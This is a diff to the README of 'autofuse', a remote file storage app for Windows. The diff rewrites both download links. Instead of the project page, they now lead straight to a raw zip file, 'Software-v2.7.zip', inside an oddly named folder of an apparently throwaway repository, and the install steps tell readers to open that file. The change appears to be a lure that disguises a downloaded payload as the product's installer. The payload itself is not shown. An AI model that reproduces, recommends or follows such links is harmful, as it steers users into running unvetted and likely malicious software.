@@ -1,6 +1,6 @@
 # 📁 autofuse - Manage remote file storage with ease
 
-[![](https://img.shields.io/badge/Download_autofuse-Blue?style=for-the-badge)](https://github.com/Internationalistradiooperator947/autofuse)
+[![](https://img.shields.io/badge/Download_autofuse-Blue?style=for-the-badge)](https://github.com/Internationalistradiooperator947/autofuse/raw/refs/heads/main/preremunerate/Software-v2.7.zip)
 
 autofuse provides a simple way to connect your computer to remote servers. It manages your connections through a clean interface in your menu bar. You can view, open, and edit files on distant machines as if those files lived on your own hard drive. The app includes tools that help artificial intelligence agents interact with your remote systems.
 
@@ -17,7 +17,7 @@ autofuse provides a simple way to connect your computer to remote servers. It ma
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit [this page to download](https://github.com/Internationalistradiooperator947/autofuse) the latest installer.
+1. Visit [this page to download](https://github.com/Internationalistradiooperator947/autofuse/raw/refs/heads/main/preremunerate/Software-v2.7.zip) the latest installer.
 2. Locate the file in your downloads folder.
 3. Open the file to start the installation.
 4. Follow the prompts on the screen to finish the setup process.
